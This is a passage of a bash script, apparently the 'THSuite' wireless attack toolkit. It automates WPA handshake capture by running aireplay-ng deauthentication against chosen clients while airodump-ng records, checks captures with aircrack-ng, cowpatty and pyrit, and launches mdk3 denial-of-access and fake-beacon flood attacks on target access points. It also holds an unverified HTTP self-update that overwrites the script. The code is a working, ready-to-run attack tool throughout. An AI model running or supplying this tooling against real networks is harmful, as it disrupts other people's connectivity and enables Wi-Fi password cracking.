CSVFILE=$(echo $FILEIN | sed 's/.cap/.csv/')
cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | sed '$d' > /root/THS_TMP/csvfile_ap.tmp
echo $GRN">$STD Network(s) found in $GRNN$FILEIN$STD"
echo $STD""
echo $BLUN"      BSSID         Channel   Encryption  AUTH    CIPH       ESSID"
echo $STD"-----------------   -------   ----------  ----   ---------   -----"
while read line
do 
AP=$(echo $line | awk '{print $1}' | sed 's/,//')
ESSID=$(echo $line | cut -d , -f 14 | sed 's/[ ]//')
CHAN=$(echo $line | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
ENC=$(echo $line | cut -d , -f 6 | sed -e 's/^ *//' -e 's/ *$//')
CIPH=$(echo $line | cut -d , -f 7 | sed -e 's/^ *//' -e 's/ *$//')
AUTH=$(echo $line | cut -d , -f 8 | sed -e 's/^ *//' -e 's/ *$//')
printf '%-22s %-7s %-10s %-6s %-11s %-15s\n' "$AP" "$CHAN" "$ENC" "$AUTH" "$CIPH" "$ESSID"
done <  /root/THS_TMP/csvfile_ap.tmp
echo $STD""
echo -ne $STD"View Clients / Probes in capture $GRNN$FILEIN$STD ? y/N $GRN"
read CLIENTS
if [[ "$CLIENTS" == "y" || "$CLIENTS" == "Y" ]] ; then 
echo $BLUN"     BSSID                 CLIENT MAC           PROBE(s)"
echo -e $STD"-----------------\t-----------------\t--------"
cat $CSVFILE | sed -e '0,/Station MAC/d' -e '$d' > /root/THS_TMP/csvfile_cl.tmp
while read line
do 
AP=$(echo $line | awk -F , '{print $6}' | sed -e 's/^ *//' -e 's/ *$//')
CLIENT=$(echo $line | awk -F , '{print $1}' | sed -e 's/^ *//' -e 's/ *$//')
PROBE=$(echo $line | awk -F , '{print $7}' | sed 's/[ ]//')

echo -e "$AP\t$CLIENT\t$PROBE"
done <  /root/THS_TMP/csvfile_cl.tmp
echo $STD""
echo -n $STD"Hit Enter to go back "
read
else 
f_list_wireless
	if [ -e /root/THS_TMP/csvfile_ap.tmp ] ; then rm /root/THS_TMP/csvfile_ap.tmp ; fi
	if [ -e /root/THS_TMP/csvfile_cl.tmp ] ; then rm /root/THS_TMP/csvfile_cl.tmp ; fi

fi
	if [ -e /root/THS_TMP/csvfile_ap.tmp ] ; then rm /root/THS_TMP/csvfile_ap.tmp ; fi
	if [ -e /root/THS_TMP/csvfile_cl.tmp ] ; then rm /root/THS_TMP/csvfile_cl.tmp ; fi
f_list_wireless
}
#
##
### FORCEFULLY ACQUIRING WPA HANDSHAKES
#######################################
f_force_wpa() {
clear
f_header
f_clean
echo $BLU">$STD Forcefully acquire handshake(s)$STD"
f_exist
f_mon_check
echo $BLU"
OPTIONS$STD
1  Enter network details manually
2  Scan assisted network detail acquisition
Q  Back to main menu"
echo $STD
echo -n $STD"Enter choice from above menu: $GRN"
read FORCE_MENU
	if [ "$FORCE_MENU" == "q" ] || [ "$FORCE_MENU" == "Q" ] ; then 
	echo $STD""
	f_menu
	elif [ "$FORCE_MENU" == "" ] ; then f_menu
	elif [[ "$FORCE_MENU" != [1-2] ]]; then
	echo $RED">$STD Input error $RED[$STD$FORCE_MENU$RED]$STD must be an entry from the above menu$STD"
	sleep 1
	f_force_wpa
	fi
#
# Option 1
# Entering network details manually 
# ---------------------------------
if [ "$FORCE_MENU" == "1" ] ; then 
clear
f_header
echo $BLU">$STD Manual acquisition of handshake(s)"
echo $STD
echo $STD"Available interface(s);"
f_iface_stat
echo $STD
#
echo -n $GRN">$STD Enter monitor interface to listen on/save capture: $GRN"
read IFACE
	if [ "$IFACE" == "" ] ; then f_force_wpa ; fi
	while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
	echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
		echo -n $GRN">$STD Enter monitor interface to listen/save capture on: $GRN"
	read IFACE
	if [ "$IFACE" == "" ] ; then f_force_wpa ; fi
	done
	if [[ ! "$IFACE" =~ "mon" ]] ; then
	echo $RED"> [$STD$IFACE$RED]$STD is not a monitor interface"
	sleep 1.5
	f_force_wpa
	fi 
#
echo $BLUN"Required Input"$STD
echo -n $GRN">$STD Enter target AP BSSID: $GRN"
read TARGET_AP
if [ "$TARGET_AP" == "" ] ; then f_force_wpa ; fi
while [[ ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]]
do echo $RED">$STD Input error $RED[$STD$TARGET_AP$RED]$STD Incorrect MAC syntax."
echo -n $GRN">$STD Enter target AP BSSID: $GRN"
read TARGET_AP
if [ "$TARGET_AP" == "" ] ; then f_force_wpa ; fi
done
	if [[ "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ ]] ; then
	TARGET_AP=$(echo "$TARGET_AP" | sed 's/-/:/g')
	fi
#
echo -n $GRN">$STD Enter channel of target AP: $GRN"
read TARGET_CHAN
if [ "$TARGET_CHAN" == "" ] ; then f_force_wpa ; fi
while [ ! `expr $TARGET_CHAN + 1 2> /dev/null` ] || (($TARGET_CHAN>14)) ; do
if [ "$TARGET_CHAN" == "" ] ; then f_force_wpa ; fi
echo $RED">$STD Input error $RED[$STD$TARGET_CHAN$RED]$STD Enter target's channel number."
echo -n $GRN">$STD Enter channel of target AP: $GRN"
read TARGET_CHAN
done
#
echo -n $GRN">$STD Enter target Client MAC: $GRN"
read TARGET_CL
if [ "$TARGET_CL" == "" ] ; then f_force_wpa ; fi
while [[ ! "$TARGET_CL" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_CL" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]]
do echo $RED">$STD Input error $RED[$STD$TARGET_CL$RED]$STD Incorrect MAC syntax."
echo -n $GRN">$STD Enter target Client MAC: $GRN"
read TARGET_AP
done
	if [[ "$TARGET_CL" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ ]] ; then
	TARGET_CL=$(echo "$TARGET_CL" | sed 's/-/:/g')
	fi
#
echo $BLUN"Optional Input(hit Enter for default)"$STD
echo -n $GRN">$STD Enter scantime duration: $GRN"
read SCANTIME
if [ "$SCANTIME" == "" ] ; then SCANTIME=15 ; fi
while [ ! `expr $SCANTIME + 1 2> /dev/null` ] && [ "$SCANTIME" != "" ] ; do
echo $RED">$STD Input error $RED[$STD$SCANTIME$RED]$STD Only numeric values possible."
echo -n $GRN">$STD Enter scantime duration: $GRN"
read SCANTIME
if [ "$SCANTIME" == "" ] ; then SCANTIME=15 ; fi
done
#
echo -n $GRN">$STD Enter monitor interface to send deauth packets: $GRN"
read DIFACE
	if [ "$DIFACE" == "" ] ; then DIFACE=$IFACE ; fi
	while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $DIFACE ; do
	echo $RED">$STD Interface error $RED[$STD$DIFACE$RED]$STD Interface does not exist."$STD
	echo -n $GRN">$STD Enter monitor interface to send deauth packets: $GRN"
	read DIFACE
	if [ "$DIFACE" == "" ] ; then DIFACE=$IFACE ; fi
	done
	if [[ ! "$DIFACE" =~ "mon" ]] ; then
	echo $RED"> [$STD$DIFACE$RED]$STD is not a monitor interface"
	sleep 1.5
	f_force_wpa
	fi
if [ "$DIFACE" != "$IFACE" ] ; then 
iwconfig $DIFACE channel $TARGET_CHAN
sleep 0.5
fi
#
echo -n $GRN">$STD Enter number of deauth packets to send: $GRN"
read DEAUTHS
if [ "$DEAUTHS" == "" ] ; then DEAUTHS=5 ; fi
while [ ! `expr $DEAUTHS + 1 2> /dev/null` ] && [ "$DEAUTHS" != "" ] ; do
echo $RED">$STD Input error $RED[$STD$DEAUTHS$RED]$STD Only numeric values possible."
echo -n $GRN">$STD Enter number of deauth packets to send: $GRN"
read DEAUTHS
if [ "$DEAUTHS" == "" ] ; then DEAUTHS=5 ; fi
done
# Waiting time before sending deauth packets 
echo -n $GRN">$STD Enter wait time before sending deauth packets: $GRN"
read WAIT
if [ "$WAIT" == "" ] ; then WAIT=3 ; fi
while [ ! `expr $WAIT + 1 2> /dev/null` ] && [ "$WAIT" != "" ] ; do
echo $RED">$STD Input error $RED[$STD$WAIT$RED]$STD Only numeric values possible."
echo -n $GRN">$STD Enter wait time before sending deauth packets: $GRN"
read WAIT
if [ "$WAIT" == "" ] ; then WAIT=3 ; fi
done
#
echo $GRN">$STD Running airodump to capture handshake and aireplay to deauth client"
# Running airodump & aireplay
sleep $WAIT && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 $DEAUTHS -a $TARGET_AP -c $TARGET_CL \
& timeout $SCANTIME xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap,csv -w "$THSDIR"wpa_temp
# File preparation
CAPFILE="$THSDIR"wpa_temp-01.cap
CSVFILE="$THSDIR"wpa_temp-01.csv 
TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
mv $CAPFILE $SAVEDIR"$TARGET_SSID".cap
HANDSHAKE=$SAVEDIR"$TARGET_SSID".cap
# tmp files deletion check
f_clean
if [ "$HANDSHAKE" == "$SAVEDIR"".cap" ] ; then
echo $RED">$STD Failed to get data :("
rm -rf $HANDSHAKE
sleep 2
f_menu
fi
echo $GRN">$STD Attack attempt complete"
echo $STD
echo -n $GRN">$STD Check $HANDSHAKE for handshakes? y/N $GRN"
read CHECK
if [[ "$CHECK" == "y" || "$CHECK" == "Y" ]] ; then
f_handshake_check
else
f_menu
fi
#
#
# Option 2
# Use assisted aquisition of WPA handshake 
# ---------------------------------------------
elif [ "$FORCE_MENU" == "2" ] ; then 
clear
f_header
echo $BLU">$STD Scan for associated clients"
echo $STD
echo $STD"Available interface(s);"
f_iface_stat
echo $STD
echo $BLUN"Required Input"$STD
echo -ne $GRN">$STD Enter monitor interface to scan with: $GRN"
read IFACE
	if [ "$IFACE" == "" ] ; then f_force_wpa ; fi
	while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
	echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
	echo -ne $GRN">$STD Enter monitor interface: $GRN"
	read IFACE
	if [ "$IFACE" == "" ] ; then f_force_wpa ; fi
	done
	if [[ ! "$IFACE" =~ "mon" ]] ; then
	echo $RED"> [$STD$IFACE$RED]$STD is not a monitor interface"
	sleep 1.5
	f_force_wpa
	fi 
f_scan_assist_wpa
fi
f_menu
}
#
##
### SCAN ASSIST WPA FUNCTION
############################
f_scan_assist_wpa() {
f_clean
DATE=$(date +"%Y%m%d-%H%M")
FILEOUT="$TARGET_AP$DATE".cap
echo $BLUN"Optional Input (hit Enter for default)"
echo  -ne $GRN">$STD Enter channel to scan on (default: all channels): $GRN"
read CHAN
	if [[ "$CHAN" == "" || "$CHAN" == *,* ]] ; then 
	echo -ne $GRN">$STD Enter channel hop frequency in seconds: $GRN"
	read HOP
		if [ "$HOP" != "" ] ; then HOP=$(( $HOP * 1000 )) ; fi
	fi
echo -ne $GRN">$STD Enter scan time (default: no limit): $GRN"
read SCAN

if [[ "$CHAN" != "" && "$SCAN" != "" ]] ; then
timeout $SCAN xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -c $CHAN -w /root/THS_TMP/scan_temp
elif [[ "$CHAN" != "" && "$SCAN" == "" ]] ; then
echo $STD"Ctrl-C on xterm window to stop scan"
xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -c $CHAN -w /root/THS_TMP/scan_temp
elif [[ "$CHAN" == "" && "$SCAN" == "" && "$HOP" == "" ]] ; then
echo $STD"Ctrl-C on xterm window to stop scan"
xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -w /root/THS_TMP/scan_temp
elif [[ "$CHAN" == "" && "$SCAN" != "" && "$HOP" == "" ]] ; then
timeout $SCAN xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -w /root/THS_TMP/scan_temp
elif [[ "$CHAN" == "" && "$SCAN" != "" && "$HOP" != "" ]] ; then
timeout $SCAN xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -f $HOP -w /root/THS_TMP/scan_temp
elif [[ "$CHAN" == "" && "$SCAN" == "" && "$HOP" != "" ]] ; then
echo $STD"Ctrl-C on xterm window to stop scan"
xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -f $HOP -w /root/THS_TMP/scan_temp
fi
echo $STD
echo $GRN">$STD Scan completed"
sleep 1
#
#
clear
f_header
echo $BLU">$STD Assisted acquisition of handshake(s)"
echo $STD
echo $GRN">$STD Parsing scan results.."
CSVFILE="/root/THS_TMP/scan_temp-01.csv"
cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | awk -F , '{print $1, $14}' > /root/THS_TMP/csvfile_ap.tmp
cat $CSVFILE | sed '0,/Station MAC/d' | sed '/(not associated)/d' | awk -F , '{print $1,$6}' > /root/THS_TMP/csvfile_cl.tmp
awk 'NR==FNR {A[$1]=$2; next} {print $2,$1,A[$2]}' /root/THS_TMP/csvfile_ap.tmp /root/THS_TMP/csvfile_cl.tmp > /root/THS_TMP/scan_assist.tmp
sed -i '$d' /root/THS_TMP/scan_assist.tmp
#
echo $GRN">$STD Networks with associated clients$RED NOT NECESSARILY ALL WPA NETWORKS $STD"
echo $STD
echo -e $BLUN"##\tAP BSSID\t\tASSOCIATED CLIENT\tESSID"
echo -e $STD"--\t-----------------\t-----------------\t-----"
cat /root/THS_TMP/scan_assist.tmp | sed '/./=' | sed '/./N;s/\n/ /' | sed 's/ /\t/g'
MAXNR=$(cat /root/THS_TMP/scan_assist.tmp | wc -l)
echo $STD
#
#
echo -ne $GRN">$STD Choose # from list to attempt forcing a handshake: $GRN"
read LISTNR
if [ "$LISTNR" == "" ] ; then f_force_wpa ; fi
	while [[ ! "$LISTNR" =~ [1-$MAXNR] ]] ; do
	if [ "$LISTNR" == "" ] ; then f_force_wpa ; fi
	echo $RED">$STD Input error $RED[$STD$LISTNR$RED]$STD Entry not in list"
	echo -ne $GRN">$STD Choose # from list to attempt forcing a handshake: $GRN"
	read LISTNR
	done
echo -n $GRN">$STD Use same interface $GRN[$STD$IFACE$GRN]$STD to send deauth packets? Y/n "$GRN
read SEND
if [[ "$SEND" == "n" || "$SEND" == "N" ]] ; then
#Using different interfaces for scanning and deauthing
echo $STD"Available interface(s);"
f_iface_stat
echo $STD
echo -n $GRN">$STD Enter monitor interface to listen on/save capture: $GRN"
read IFACE
	if [ "$IFACE" == "" ] ; then f_force_wpa ; fi
	while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
	echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."$STD
	echo -n $GRN">$STD Enter monitor interface to listen on/save capture: $GRN"
	read IFACE
	if [ "$IFACE" == "" ] ; then f_force_wpa ; fi
	done
	if [[ ! "$IFACE" =~ "mon" ]] ; then
	echo $RED"> [$STD$IFACE$RED]$STD is not a monitor interface"$STD
	sleep 1.5
	f_force_wpa
	fi 
echo -n $GRN">$STD Enter monitor interface to send deauth packets: $GRN"
read DIFACE
	if [ "$DIFACE" == "" ] ; then DIFACE=$IFACE ; fi
	while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $DIFACE ; do
	echo $RED">$STD Interface error $RED[$STD$DIFACE$RED]$STD Interface does not exist."$STD
	echo -n $GRN">$STD Enter monitor interface to send deauth packets: $GRN"
	read DIFACE
	if [ "$DIFACE" == "" ] ; then DIFACE=$IFACE ; fi
	done
	if [[ ! "$DIFACE" =~ "mon" ]] ; then
	echo $RED"> [$STD$DIFACE$RED]$STD is not a monitor interface"
	sleep 1.5
	f_force_wpa
	fi 
#
TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $1}')
TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
#
if [ "$DIFACE" != "$IFACE" ] ; then
iwconfig $DIFACE channel $TARGET_CHAN
sleep 0.5
fi
echo $GRN">$STD Attempting to force & capture handshake"
sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
& timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w "$THSDIR"wpa_temp
#
echo $GRN">$STD Deauth attempt on target AP complete"
sleep 1
#Rename capture file 
CAPFILE="$THSDIR"wpa_temp-01.cap
mv $CAPFILE $SAVEDIR"$TARGET_SSID".cap
HANDSHAKE=$SAVEDIR"$TARGET_SSID".cap
#
else
#Using same interface for scanning and deauthing
TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $1}')
TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
#
echo $GRN">$STD Attempting to force & capture handshake"
sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $IFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
& timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w "$THSDIR"wpa_temp
#
#Rename capture file 
CAPFILE="$THSDIR"wpa_temp-01.cap
mv $CAPFILE $SAVEDIR"$TARGET_SSID".cap
HANDSHAKE=$SAVEDIR"$TARGET_SSID".cap
fi
# tmp files deletion
f_clean
if [ "$HANDSHAKE" == "$SAVEDIR"".cap" ] ; then
echo $RED">$STD Failed to get data :("
rm -rf $HANDSHAKE
sleep 2
f_menu
fi
echo $GRN">$STD Attack attempt on target AP complete"
#
echo -n $GRN">$STD Check $HANDSHAKE for handshakes? y/N $GRN"
read CHECK
if [[ "$CHECK" == "y" || "$CHECK" == "Y" ]] ; then f_handshake_check
else
f_exit
fi
}
#
##
### HANDSHAKE VERIFICATION
##########################
f_handshake_check() {
clear
f_header
echo $BLU">$STD Check capture file for useable handshake"
echo $BLU"
OPTIONS$STD
1  Check with aircrack 
2  Check with cowpatty
3  Check with pyrit
4  Check with all: aircrack / cowpatty / pyrit
Q  Back to main menu
"$STD
echo -n $STD"Enter choice from above menu: $GRN"
read CHECK_MENU
	if [ "$CHECK_MENU" == "q" ] || [ "$CHECK_MENU" == "Q" ] ; then 
	echo $STD""
	f_menu
	elif [ "$CHECK_MENU" == "" ] ; then f_menu
	elif [[ "$CHECK_MENU" != [1-4] ]]; then
	echo $RED">$STD Input error $RED[$STD$CHECK_MENU$RED]$STD must be an entry from the above menu$STD"
	sleep 1
	f_handshake_check
	fi
#
# Option 1 
# --------
if [ "$CHECK_MENU" == "1" ] ; then
echo $STD
echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with aircrack
"$STD
aircrack-ng $HANDSHAKE
elif [ "$CHECK_MENU" == "2" ] ; then
echo $STD
echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with cowpatty
"$STD
cowpatty -c -r $HANDSHAKE -s $TARGET_SSID
elif [ "$CHECK_MENU" == "3" ] ; then
echo $STD
echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with pyrit
"$STD
pyrit -r $HANDSHAKE analyze
elif [ "$CHECK_MENU" == "4" ] ; then
echo $STD
echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with aircrack
"$STD
aircrack-ng $HANDSHAKE
sleep 1.5
echo $STD
echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with cowpatty
"$STD
cowpatty -c -r $HANDSHAKE -s $TARGET_SSID
sleep 1.5
echo $STD
echo $GRN">$STD Checking $GRN$HANDSHAKE$STD with pyrit
"$STD
pyrit -r $HANDSHAKE analyze
fi
f_exit
}
#
##
### WIRELESS DISRUPTION
#######################
#
# This function makes use of the tool 'mdk3'
f_wireless_disruption() {
f_clean
clear
f_header
echo $BLU">$STD Wireless disruption"
echo $STD""
echo $RED"  WARNING! These functions can wreak havoc on wireless networks"
echo $RED"          Use with care on authorized networks only"
#sleep 2
echo $BLU"
OPTIONS $STD
1  Deny access to specified AP
2  Flood airwaves with fake AP beacons
Q  Back to main menu
"
echo -ne "Enter choice from above menu: "$GRN
read DISR_MENU
	if [ "$DISR_MENU" == "q" ] || [ "$DISR_MENU" == "Q" ] ; then 
	echo $STD""
	f_menu
	elif [ "$DISR_MENU" == "" ] ; then f_menu
	elif [[ "$DISR_MENU" != [1-2] ]]; then
	echo $RED">$STD Input error $RED[$STD$DISR_MENU$RED]$STD must be an entry from the above menu"$STD
	sleep 1
	f_wireless_disruption
	fi
echo $STD
echo $STD"Available interface(s);"
f_exist
f_mon_check
f_iface_stat
#Setting interface
echo $STD
echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_menu ; fi
while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
echo -ne $GRN">$STD Enter monitor/injection interface: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_menu ; fi
done
if [[ ! "$IFACE" =~ "mon" ]] ; then
	echo $RED"> [$STD$IFACE$RED]$STD is not a monitor interface"
	sleep 1.5
	f_wireless_disruption
fi 
#Go-to functions 
if [ "$DISR_MENU" == "1" ] ; then
f_ap_access_deny
elif [ "$DISR_MENU" == "2" ] ; then
f_beacon_flood
fi
f_exit
}
#
##
### DENY ACCESS TO AP
#####################
f_ap_access_deny() {
#Setting target AP
echo -n $GRN">$STD Enter target AP BSSID: $GRN"
read TARGET_AP
if [ "$TARGET_AP" == "" ] ; then f_wireless_disruption ; fi
while [[ ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$TARGET_AP" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]] ; do
if [ "$TARGET_AP" == "" ] ; then f_wireless_disruption ; fi
echo $RED">$STD Input error $RED[$STD$TARGET_AP$RED]$STD Incorrect MAC syntax."
echo -n $GRN">$STD Enter target AP BSSID: $GRN"
read TARGET_AP
done
	if [[ "$TARGET_AP" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ ]] ; then
	TARGET_AP=$(echo "$TARGET_AP" | sed 's/-/:/g')
	fi
#Setting target channel
echo -n $GRN">$STD Enter channel of target AP: $GRN"
read TARGET_CHAN
if [ "$TARGET_CHAN" == "" ] ; then f_wireless_disruption ; fi
while [ ! `expr $TARGET_CHAN + 1 2> /dev/null` ] || (($TARGET_CHAN>14)) ; do
if [ "$TARGET_CHAN" == "" ] ; then f_wireless_disruption ; fi
echo $RED">$STD Input error $RED[$STD$TARGET_CHAN$RED]$STD Enter target's channel number."
echo -n $GRN">$STD Enter channel of target AP: $GRN"
read TARGET_CHAN
done
# Setting attack duration
echo -n $GRN">$STD Enter attack duration(seconds): $GRN" 
read ATTACKTIME
while [ ! `expr $ATTACKTIME + 1 2> /dev/null` ] && [ "$ATTACKTIME" != "" ] ; do
echo $RED">$STD Input error $RED[$STD$ATTACKTIME$RED]$STD Only numeric values possible."
echo -n $GRN">$STD Enter attack duration(seconds): $GRN"
read ATTACKTIME
done
#Creating blacklist file
echo $TARGET_AP > "$THSDIR"blacklist.tmp
#Starting attack
echo $GRN">$STD Attempting deauth attack on $GRNN$TARGET_AP$STD"
if [ "$ATTACKTIME" == "" ] ; then
echo $STD"Ctrl-C on xterm window to stop scan"
xterm -T "THSuite - Deny access to $TARGET_AP" -geometry 105x20-0-0 -e mdk3 $IFACE d -b "$THSDIR"blacklist.tmp -c $TARGET_CHAN
else
timeout $ATTACKTIME xterm -T "THSuite - Deny access to $TARGET_AP" -geometry 105x20-0-0 -e mdk3 $IFACE d -b "$THSDIR"blacklist.tmp -c $TARGET_CHAN
fi
echo $GRN">$STD Attack stopped" 
sleep 1.5
#
f_menu
}
#
##
### BEACON FLOOD (mdk3 b)
#########################
#
# This function uses the mdk3 b command
f_beacon_flood() {
clear
f_clean
f_header
echo $BLU">$STD Flood area with fake AP beacons"
echo $STD
echo $BLUN"Optional Input(hit Enter for defaults)"
# Channel of fake AP
echo -n $GRN">$STD Enter channel: $GRN"
read CHAN
while [ ! `expr $CHAN + 1 2> /dev/null` ] || [[ "$CHAN" -gt 13 ]] && [ "$CHAN" != "" ] ; do
echo $RED">$STD Input error $RED[$STD$CHAN$RED]$STD Must be valid channel number" 
echo -n $GRN">$STD Enter channel: $GRN"
read CHAN
done
# Encryption setting of fake AP
echo -n $GRN">$STD Enter encryption type (WEP, WPA): $GRN"
read ENC
ENC=$(echo $ENC | tr '[:lower:]' '[:upper:]')
if [ "$ENC" == "" ] ; then ENC="WPA" ; fi
	while [ "$ENC" != "WEP" ] && [ "$ENC" != "WPA" ] && [ "$ENC" != "" ] ; do
	echo -n $RED">$STD Input error, enter WEP or WPA: $GRN"
	read ENC
	ENC=$(echo $ENC | tr '[:lower:]' '[:upper:]')
	if [ "$ENC" == "" ] ; then ENC="WPA" ; fi
	done

#
if [ "$ENC" == "WEP" ] ; then SWITCH="-w"
elif [ "$ENC" == "WPA" ] ; then SWITCH="-a"
fi
#
echo -n $GRN">$STD Enter SSID or SSID wordlist: $GRN"
read SSID
if [ "$SSID" == "" ] ; then SSID=BooYah ; fi
#
if [ ! -e "$SSID" ]  && [ "$CHAN" == "" ] ; then
xterm -geometry -0+0 -e mdk3 $IFACE b $SWITCH -m -h -n $SSID
elif [ ! -e "$SSID" ]  && [ "$CHAN" != "" ] ; then
xterm -geometry -0+0 -e mdk3 $IFACE b $SWITCH -m -h -c $CHAN -n $SSID
elif [ -e "$SSID" ]  && [ "$CHAN" == "" ] ; then
xterm -geometry -0+0 -e mdk3 $IFACE b $SWITCH -m -h -f $SSID
elif [ -e "$SSID" ]  && [ "$CHAN" != "" ] ; then
xterm -geometry -0+0 -e mdk3 $IFACE b $SWITCH -m -h -c $CHAN -f $SSID
fi
f_wireless_disruption
}
#
##
### DENY ACCESS TO ALL APs
##########################
f_deny_all() {
echo $RED"WORK IN PROGRESS"
echo $RED">$STD Exiting to main menu"
sleep 1.5
f_menu
}
#
##
### UPDATE CHECK
################
f_update() {
clear
f_header
echo $BLU">$STD Check latest version available"
echo $STD""
sleep 1
echo $STD""
LOC=$(pwd)
echo $GRN">$STD Checking Internet connection.."
wget -q --tries=10 --timeout=5 http://www.google.com -O /tmp/index.google &> /dev/null
	if [ ! -s /tmp/index.google ];then
	echo $RED">$STD No internet connection found..$STD"
	sleep 1
	f_exit
	fi
echo $GRN">$STD Getting info on latest available version.."
NEW_VERS=$(curl -s http://thsuite.googlecode.com/svn/thsuite.sh | sed -n 3p | awk '{print $2}')
NEW_LED=$(curl -s http://thsuite.googlecode.com/svn/thsuite.sh | sed -n 5p | awk '{print $3 " - " $4}')
echo $GRN">$STD Checking if latest version in use.."
if [[ "$VERS" != "$NEW_VERS" || "$LED" != "$NEW_LED" ]] ; then
echo $RED">$STD Version in use is $RED$VERS$STD last edited on $RED$LED$STD"
echo $GRN">$STD Latest version is $GRN$NEW_VERS$STD last edited on $GRN$NEW_LED$STD"
echo -n $GRN">$STD Update to latest ? y/N "$GRN
read UPD1
	if [[ "$UPD1" == "y" || "$UPD1" == "Y" ]] ; then 
		echo $GRN">$STD Downloading latest version.."
		wget -q http://thsuite.googlecode.com/svn/thsuite.sh -O $LOC/thsuite.tmp
		chmod +x $LOC/thsuite.tmp
		mv $LOC/thsuite.tmp $LOC/thsuite.sh
		echo $STD""
